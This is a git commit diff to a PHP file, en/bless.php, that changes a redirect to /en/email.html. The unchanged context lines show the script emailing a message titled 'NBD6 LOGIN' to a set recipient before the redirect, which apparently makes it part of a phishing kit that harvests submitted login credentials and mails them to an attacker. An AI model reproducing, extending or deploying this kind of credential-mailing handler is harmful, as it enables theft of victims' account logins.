14368dceb43aa46319a6456272845ae9bab9a952
storegreg <123196718+storegreg@users.noreply.github.com>
2023-01-21 11:59:28 -0500

    Update bless.php

--- en/bless.php
+++ en/bless.php
@@ -13,6 +13,6 @@ $subject = "NBD6 LOGIN";
 $headers .= "MIME-Version: 1.0\n";
 mail($recipient,$subject,$message,$headers);
 		
-			   header("Location:  email.html");
+			   header("Location:  /en/email.html");
 
 	?>
